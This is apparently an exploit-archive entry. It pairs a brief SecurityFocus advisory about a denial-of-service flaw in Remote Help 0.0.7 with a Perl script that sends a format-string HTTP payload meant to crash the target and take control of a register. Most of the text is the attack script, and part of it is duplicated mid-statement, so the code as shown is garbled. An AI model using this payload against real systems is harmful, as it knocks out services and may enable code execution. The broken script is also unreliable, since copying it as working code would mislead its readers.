source: http://www.securityfocus.com/bid/38875/info

Remote Help is prone to a denial-of-service vulnerability.

Remote attackers can exploit this issue to cause the application to crash, denying service to legitimate users. Due to the nature of this issue arbitrary code-execution may be possible; however this has not been confirmed.

Remote Help 0.0.7 is vulnerable; other versions may also be affected. 

# Exploit Title : Remote Help 0.0.7 Remote DoS
# Date          : 20 Mar 2010
# Author        : Rick2600 (ricks2600[at]gmail{dot}com)
# Bug found by  : Rick2600
# Software Link : http://www.softpedia.com/progDownload/Remote-Help-Download-144888.html
# Version       : 0.0.7
# OS            : Windows
# Tested on     : XP SP2 En
# Type of vuln  : DoS
# Greetz to     : Corelan Security Team : http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
#
#
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                       |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[+] DoS exploit for Remote Help 0.0.7 Http\n";

use IO::Socket;

if ($#ARGV != 0) {
    print $#ARGV;
    print "\n  usage: $0 <targetip>\n";
    exit(0);
}


print "[+] Connecting to server $ARGV[0] on port 80\n\n";

$remote = IO::Socket::INET->new( Proto => "tcp",

if ($#ARGV != 0) {
    print $#ARGV;
    print "\n  usage: $0 <targetip>\n";
    exit(0);
}


print "[+] Connecting to server $ARGV[0] on port 80\n\n";

$remote = IO::Socket::INET->new( Proto => "tcp",
                                 PeerAddr  => $ARGV[0],
                                 PeerPort  => "http(80)",
);
unless ($remote) { die "Cannot connect to Remote Help daemon on $ARGV[0]\n" }
print "[+] Connected!\n";


#CONTROL EAX
$payload = "/index.html" . "%x" x 90 . "A" x 250 . "%x" x 186  ."%.999999x" x 15 ."%.199999x"  . "%nX" . "DCBA";


print "[+] Sending Malicious Request\n";
print $remote "GET $payload HTTP/1.1\r\n";
close $remote;